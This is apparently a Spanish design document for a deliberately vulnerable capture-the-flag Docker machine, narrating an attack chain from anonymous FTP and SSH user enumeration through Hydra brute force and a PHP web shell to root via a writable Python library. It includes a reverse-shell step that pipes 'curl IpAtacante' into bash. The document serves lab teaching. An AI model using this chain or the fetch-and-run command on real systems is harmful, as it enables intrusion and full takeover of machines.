# **Máquina: Diseño Inseguro**

## Objetivo
Esta máquina está específicamente diseñada para explotar la vulnerabilidad ***A04:2021 - Diseño Inseguro*** y otras vulnerabilidades.

## Planteamiento
Para cumplir con este objetivo, la máquina alojará varios servicios como **FTP**, **SSH** y **Apache**.

Estos servicios se encontrarán expuestos externamente para que cuando el atacante realice un reconocimiento pueda detectarlos.

El servicio **FTP** podrá ser accesible de forma anónima. Este servicio tendrá una configuración insegura.

El servicio de **SSH** no tendrá ninguna función más que despistar al atacante. Este servicio será vulnerable a enumeración de usuarios del sistema.

El servicio de **apache** alojará nuestra pagina web la cual esta inspirada en la serie **Los Originales**. La web será vulnerable a la vulnerabilidad **Diseño Inseguro**, la cual estará enfocada a una gestión insegura de los permisos de usuarios FTP.

****

Para comenzar el atacante realizará un reconocimiento de los servicios expuestos por la maquina, y de primeras podrá ver que el servicio **FTP** es propenso a hacer un login mediante el usuario de **anonymous** y que el **SSH** es propenso a enumeración de usuarios.

Cuando el atacante se ponga a revisar la web y realizar **FUZZING** para descubrir subdirectorios ocultos, encontrará el directorio **documents**, el cual al intentar acceder no tendra permisos de lectura.

Si el atacante sigue revisando la web, encontrará que no hay ningun vector de entrada a través de la pagina web, por lo cual se pondrá a probar que puede hacer con el usuario de **anonymous** en **FTP**, pero se dará cuenta que con este usuario tampoco puede realizar acciones importantes para vulnerar la maquina.

El atacante se pondrá a revisar mejor la web y verá que se hablan de personajes de la serie, por lo cual se creará un diccionario con nombres de usuario relacionados con los personajes de la serie **Los Originales**, de esta forma el atacante utilizará una script en **Python** para enumerar los usuarios existentes del sistema mediante **SSH**, consiguiendo encontrar al usuario **elijah** existente en la maquina.

Una vez el atacante sepa que el usuario **elijah** existe en la maquina, utilizará la herramienta **Hydra** junto con el diccionario de contraseñas **rockyou.txt** y el usuario **elijah** para realizar un ataque de fuerza bruta e intentar averiguar la contraseña del usuario atacando al servicio de **FTP**, de esta forma obtendremos la contraseña del usuario **elijah** para acceder al **FTP**.

Cuando el atacante acceda al **FTP** con el usuario de **elijah** podrá ver que puede visualizar un directorio **elijah**, en el cual despues de probar a realizar que acciones puede hacer, verá que puede subir ficheros dentro de este directorio **elijah**, de esta forma el atacante subira un fichero **cmd.php** el cual tendrá codigo en PHP para realizar una **RCE**.

Sabiendo todo esto, el atacante accederá al directorio **documents** dentro de la web y verá que dentro de **documents** existe **elijah**, de esta forma llegará a la conclusión que el fichero con el **RCE** que ha subido dentro de **elijah** por **FTP** esta sincronizado con los directorios de la web, por lo que si accede a este fichero y ejecuta **cmd=whoami** y por pantalla le muestra **www-data** verá que tiene ejecución remota de comandos.

De esta forma el atacante, se creará un **index.html** con codigo para ejecutarse una **reverse shell** en **bash**, se creará un servicio **HTTP** y se pondra en escucha por el **puerto 443**, dentro de la url hará que la maquina realice un **curl** a la IP del atacante y "pipeara" el resultado con **bash** **(http://IpMaquina/cmd.php?cmd=curl IpAtacante | bash)**, realizando esto obtendremos una **reverse shell** y obtendremos acceso a la maquina como **www-data** en donde realizaremos un tratamiento de la **TTY**.

Una vez ya tenemos acceso como **www-data** dentro de la maquina, el atacante encontrará una imagen del personaje de **caroline**, esta imagen tendra el nombre de **caroline.jpg** y estara ubicado en **/var/www/**, esta imagen tendrá un fichero **zip** oculto, que se podrá extraer mediante la herramienta de **binwalk**, una vez el atacante ha extraido este fichero **zip** vera que al intentar **"unzipearlo"** este se encuentra protegido con contraseña, por lo cual se deberá extraer un **hash** de la contraseña mediante **zip2john** y despues crackear este **hash** con la herramienta de **John**.

Cuando se tenga la contraseña del fichero **zip**, lo descomprimimos y veremos un fichero con muchas contraseñas, las cuales estas contraseñas se utilizaran junto al usuario de **caroline** y la herramienta de **Hydra** para descubrir si alguna de estas contraseñas pertenece la usuaria **caroline** y es posible acceder por **SSH**.

Con **Hydra** descubrimos la contraseña de **caroline** e iniciamos sesión por **SSH** para obtener acceso a la maquina, una vez tenemos acceso a la maquina con la usuaria **caroline**, el atacante el atacante podrá visualizar la flag **user.txt** en el directorio **/home/caroline/**.
El atacante se pondrá a buscar la forma de escalar privilegios, despues de estar buscando encontrará que puede ejecutar el binario de **python3.10** sin contraseña como **root**. Además tambien encontrará en el **home** de la usuaria **caroline**, un fichero con nombre **codificadorNombres.py**, el cual tiene la función de mostrar el nombre que reciba como parametro a **base64**.

Si el atacante visualiza como funciona este script verá que se importan las librerias de **system** y **base64**, sabiendo esto, se pondra verificará y encontrará que los permisos de la libreria **base64.py** para **python3.10** tiene permisos para que **otros** puedan modificar el contenido de la libreria y guardarlo, por lo cual el atacante editará el fichero de **base64.py** y en la función de **b64enconde** que utiliza el **script** de **codificadorNombres.py** se añadira una linea para que cuando se ejecute el **script**, el usuario que ejecute el script **"spawnee"** una **bash**.

De esta forma como el atacante puede ejecutar el binario **python3.10** como **root**, ejecutará el **script codificadorNombres.py**  utilizando **python3.10** como el usuario **root**, de esta forma se **"spawneara"** una **bash** como **root**, por lo tanto el atacante habria escalado sus privilegios al usuario con más privilegios.

Una vez tenga acceso con el usuario **root**, el atacante podrá visualizar el flag de **root.txt** dentro de **/root/**, además de obtener acceso completo a toda la maquina.

## Configuración del entorno
Para configurar el entorno utilizaremos un contenedor Docker con el sistema operativo Ubuntu Server. Los servicios que utilizaremos son:

- **FTP**: *vsftpd 3.0.5* --> Para transferencia de archivos.
- **SSH**: *OpenSSH 7.2p2* --> Para acceso remoto seguro.
- **HTTP**: *Apache 2.4.52* --> Para el servidor web.
 
## Pasos a seguir

1. **Instalación de Docker**
2. **Creación del Dockerfile**
3. **Verificación de contenedor Docker**
4. **Primeras pruebas de Docker**
5. **Configuración de la máquina y paquetes**
6. **Testeo de vulnerabilidades**
7. **Aplicar mejoras y corregir errores/problemas**
8. **Volver a testear las vulnerabilidades**
9. **Redactar el reporte y documentación final**

## WriteUp (vista atacante)

Realizamos un escaneo de los puertos de la maquina.

![](../Imagenes/1_diseñoInseguro.png)

